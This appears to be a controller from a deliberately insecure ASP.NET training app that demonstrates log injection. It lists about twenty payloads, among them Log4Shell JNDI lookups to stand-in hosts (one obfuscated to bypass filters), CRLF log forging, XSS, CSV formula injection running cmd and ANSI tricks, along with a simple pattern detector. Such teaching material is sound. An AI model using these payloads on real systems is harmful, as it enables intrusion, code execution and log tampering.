using Microsoft.AspNetCore.Mvc;
using InsecureAppWebNet8.Models;
using InsecureAppWebNet8.ViewModels;
using System.Text.RegularExpressions;

namespace InsecureAppWebNet8.Controllers
{
    public class InjectionLogController : Controller
    {
        private readonly ILogger<InjectionLogController> _logger;
        private readonly string _logFilePath;
        private readonly Dictionary<string, AttackInfo> _attackInfos;

        public InjectionLogController(
            ILogger<InjectionLogController> logger,
            IWebHostEnvironment env)
        {
            _logger = logger;
            _logFilePath = Path.Combine(env.WebRootPath, "logs", "log.txt");
            Directory.CreateDirectory(Path.GetDirectoryName(_logFilePath)!);

            _attackInfos = new()
            {
                ["basic-multiline"] = new AttackInfo
                {
                    Description = "Injection multi-ligne basique pour falsifier les logs.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/Log_Injection",
                    RiskLevel = "Medium",
                    PayloadExample = "stephane\n[OK] admin authenticated",
                    ErrorExplanation = "Ajoute une fausse ligne dans les journaux, trompe l’analyse."
                },
                ["truncate"] = new AttackInfo
                {
                    Description = "Troncature/masquage de contexte dans le log.",
                    LearnMoreUrl = "https://www.acunetix.com/vulnerabilities/web/log-injection/",
                    RiskLevel = "Low",
                    PayloadExample = "john\n-------------------------",
                    ErrorExplanation = "Le log semble ‘reset’ ou coupé à cet endroit."
                },
                ["crlf-logsplit"] = new AttackInfo
                {
                    Description = "Injection CRLF pour créer une nouvelle entrée log.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/CRLF_Injection",
                    RiskLevel = "Medium",
                    PayloadExample = "attacker\r\n[ALERT] User promoted to admin",
                    ErrorExplanation = "Génère une nouvelle ligne, sépare ou injecte du log."
                },
                ["ansi-red"] = new AttackInfo
                {
                    Description = "Séquence ANSI : texte rouge (affichage terminal/log coloré).",
                    LearnMoreUrl = "https://book.hacktricks.xyz/pentesting-web/log-injection",
                    RiskLevel = "Low",
                    PayloadExample = "\u001b[31mERREUR: accès root\u001b[0m",
                    ErrorExplanation = "Le log s’affiche en rouge en console."
                },
                ["ansi-bold"] = new AttackInfo
                {
                    Description = "Séquence ANSI : gras.",
                    LearnMoreUrl = "https://book.hacktricks.xyz/pentesting-web/log-injection",
                    RiskLevel = "Low",
                    PayloadExample = "\u001b[1mBold log\u001b[0m",
                    ErrorExplanation = "Accentue le texte dans certains outils/logs."
                },
                ["ansi-clear"] = new AttackInfo
                {
                    Description = "ANSI clear-screen : efface visuellement les logs précédents.",
                    LearnMoreUrl = "https://book.hacktricks.xyz/pentesting-web/log-injection",
                    RiskLevel = "Low",
                    PayloadExample = "\u001b[2J\u001b[H-- logs effacés --",
                    ErrorExplanation = "Peut faire disparaître le log visuellement en console."
                },
                ["log4shell"] = new AttackInfo
                {
                    Description = "Log4Shell (jndi, log4j) : exécution côté serveur vulnérable.",
                    LearnMoreUrl = "https://www.lunasec.io/docs/blog/log4j-zero-day/",
                    RiskLevel = "Critical",
                    PayloadExample = "${jndi:ldap://evilhost/pwn}",
                    ErrorExplanation = "Peut déclencher une exploitation serveur (RCE) via log4j vulnérable."
                },
                ["log4shell-obfusque"] = new AttackInfo
                {
                    Description = "Log4Shell ofusqué pour bypass de filtre.",
                    LearnMoreUrl = "https://www.lunasec.io/docs/blog/log4j-zero-day/",
                    RiskLevel = "Critical",
                    PayloadExample = "${${lower:j}${upper:n}${lower:d}${lower:i}:ldap://evil.com/a}",
                    ErrorExplanation = "Contourne certains filtres log4j naïfs."
                },
                ["siem-xml"] = new AttackInfo
                {
                    Description = "Payload XML : déclenche une fausse alerte SIEM.",
                    LearnMoreUrl = "https://book.hacktricks.xyz/pentesting-web/log-injection",
                    RiskLevel = "Medium",
                    PayloadExample = "<alert type='critical'>Root accessed!</alert>",
                    ErrorExplanation = "Déclencheur de fausse alerte sur un SIEM."
                },
                ["siem-json"] = new AttackInfo
                {
                    Description = "Payload JSON pour tromper un parseur SIEM.",
                    LearnMoreUrl = "https://book.hacktricks.xyz/pentesting-web/log-injection",
                    RiskLevel = "Medium",
                    PayloadExample = "{\"event\":\"intrusion\",\"user\":\"root\"}",
                    ErrorExplanation = "Peut perturber les analytiques SIEM JSON."
                },
                ["xss-script"] = new AttackInfo
                {
                    Description = "Payload XSS JS classique.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/xss/",
                    RiskLevel = "Medium",
                    PayloadExample = "<script>alert('logxss')</script>",
                    ErrorExplanation = "Si le log est affiché dans une UI web, peut déclencher du code JS."
                },
                ["xss-img"] = new AttackInfo
                {
                    Description = "Payload XSS via image onerror.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/xss/",
                    RiskLevel = "Medium",
                    PayloadExample = "<img src=x onerror=alert('xss')>",
                    ErrorExplanation = "Variante XSS pour UI web."
                },
                ["csv-excel"] = new AttackInfo
                {
                    Description = "Injection CSV/Excel (formule).",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/CSV_Injection",
                    RiskLevel = "Medium",
                    PayloadExample = "=cmd|' /C calc'!A0",
                    ErrorExplanation = "Se déclenche à l’export CSV et ouverture Excel."
                },
                ["csv-excel2"] = new AttackInfo
                {
                    Description = "Formule Excel alternative.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/CSV_Injection",
                    RiskLevel = "Medium",
                    PayloadExample = "+cmd|' /C notepad'!A0",
                    ErrorExplanation = "Autre syntaxe CSV Excel exploit."
                },
                ["tabulation"] = new AttackInfo
                {
                    Description = "Injection de tabulations pour tromper l’affichage colonne.",
                    LearnMoreUrl = "https://book.hacktricks.xyz/pentesting-web/log-injection",
                    RiskLevel = "Low",
                    PayloadExample = "login\t\tadmin\t\tsuccess",
                    ErrorExplanation = "Décale les colonnes en affichage log viewer."
                },
                ["json-break"] = new AttackInfo
                {
                    Description = "Cassage de JSON pour perturber les logs JSON concaténés.",
                    LearnMoreUrl = "https://book.hacktricks.xyz/pentesting-web/log-injection",
                    RiskLevel = "Low",
                    PayloadExample = "{\"injection\":true, //",
                    ErrorExplanation = "Peut casser ou injecter dans les logs JSON concat."
                },
                ["header-inject"] = new AttackInfo
                {
                    Description = "Injection de header HTTP.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/CRLF_Injection",
                    RiskLevel = "Low",
                    PayloadExample = "victim\r\nSet-Cookie: admin=true",
                    ErrorExplanation = "Ajoute un header dans le log (reverse proxy ou parser naïf)."
                },
                ["syslog"] = new AttackInfo
                {
                    Description = "Faux log syslog/RFC5424.",
                    LearnMoreUrl = "https://datatracker.ietf.org/doc/html/rfc5424",
                    RiskLevel = "Low",
                    PayloadExample = "<34>1 2023-07-09T17:54:32Z host app - - - [attack] succeeded",
                    ErrorExplanation = "Trompe un parseur syslog."
                },
                ["unicode-rtl"] = new AttackInfo
                {
                    Description = "Payload Unicode RTL (Right-to-left override).",
                    LearnMoreUrl = "https://www.tiraniddo.dev/2017/08/the-trouble-with-unicode.html",
                    RiskLevel = "Low",
                    PayloadExample = "\u202Egnp.exe",
                    ErrorExplanation = "Change l’ordre d’affichage dans certains logs/viewers."
                },
                ["prank-flood"] = new AttackInfo
                {
                    Description = "Payload DoS / Flood log.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/Log_Injection",
                    RiskLevel = "Low",
                    PayloadExample = new string('A', 5000),
                    ErrorExplanation = "Déni de service, saturation de la volumétrie log."
                },
                ["fake-timestamp"] = new AttackInfo
                {
                    Description = "Payload pour tromper le timestamp ou l’ordre des logs.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/Log_Injection",
                    RiskLevel = "Low",
                    PayloadExample = "2025-07-09T10:00:00Z [INFO] User: attacker",
                    ErrorExplanation = "Peut perturber l’analyse temporelle/DFIR."
                }
            };
        }

        [HttpGet]
        public IActionResult Index()
        {
            var model = new VulnerabilityViewModel<string>
            {
                AttackType = "",
                Payload = "",
                Results = new(),
                AttackInfos = _attackInfos
            };
            return View(model);
        }

        [HttpPost]
        public IActionResult Index(string attackType, string payload)
        {
            try
            {
                _logger.LogWarning("[LogInjection] Payload reçu: {Payload}", payload);

                var logs = ReadLogLines();
                if (logs.Count > 20)
                    logs = logs.Skip(logs.Count - 20).ToList();

                var findings = DetectLogInjectionIndicators(payload);

                var model = VulnerabilityViewModel<string>.WithResults(payload, attackType, logs);
                model.AttackInfos = _attackInfos;
                model.ErrorExplanations = findings;

                return View(model);
            }
            catch (Exception ex)
            {
                var model = VulnerabilityViewModel<string>.WithError(payload, attackType, ex.Message);
                model.AttackInfos = _attackInfos;
                return View(model);
            }
        }

        [HttpPost]
        public IActionResult ClearLogs()
        {
            try
            {
                // Marque la purge dans le log (audit)
                _logger.LogInformation("[LogInjection] Purge visuelle demandée par l'utilisateur.");
                // Ne touche pas au fichier (pas de file in use, ni d'erreur Serilog)
                return Ok();
            }
            catch (Exception ex)
            {
                return StatusCode(500, ex.Message);
            }
        }

        private List<string> ReadLogLines()
        {
            var lines = new List<string>();
            if (System.IO.File.Exists(_logFilePath))
            {
                using (var fs = new FileStream(_logFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var sr = new StreamReader(fs))
                {
                    string? line;
                    while ((line = sr.ReadLine()) != null)
                        lines.Add(line);
                }
            }
            return lines;
        }

        private Dictionary<string, string> DetectLogInjectionIndicators(string input)
        {
            var detections = new Dictionary<string, string>();
            if (input.Contains("\n") || input.Contains("\r"))
                detections["Retour ligne"] = "Payload contient des sauts de ligne ⇒ injection multi-ligne, CRLF, log split, etc.";
            if (Regex.IsMatch(input, @"\u001b\[[0-9;]*[a-zA-Z]"))
                detections["Séquence ANSI"] = "Séquence ANSI détectée (coloration, clear, etc.).";
            if (input.Contains("${jndi:"))
                detections["JNDI/Log4Shell"] = "Payload type Log4Shell détecté.";
            if (input.Contains("<alert"))
                detections["SIEM/Alert"] = "Payload susceptible de déclencher une alerte SIEM (XML).";
            if (input.StartsWith("=") || input.StartsWith("+") || input.StartsWith("@"))
                detections["CSV/Excel"] = "Payload de type CSV/Excel Injection.";
            if (input.Contains("<script>") || input.Contains("onerror"))
                detections["XSS"] = "Payload XSS détecté (risque UI si affiché non échappé).";
            if (input.Contains("{") && input.Contains("}"))
                detections["JSON"] = "Payload structuré JSON, peut tromper un parser.";
            if (input.Contains("\t"))
                detections["Tabulation"] = "Payload utilise des tabulations (peut tromper les logs colonne).";
            if (input.Contains("\u202E"))
                detections["Unicode RTL"] = "Payload Unicode Right-to-left override détecté.";
            if (input.Length > 500)
                detections["Flood"] = "Payload de flood/DoS log détecté.";
            if (input.Contains("2025-07-09T10:00:00Z") || input.Contains("fake_timestamp"))
                detections["Timestamp"] = "Payload visant à perturber la chronologie des logs.";
            return detections;
        }
    }
}
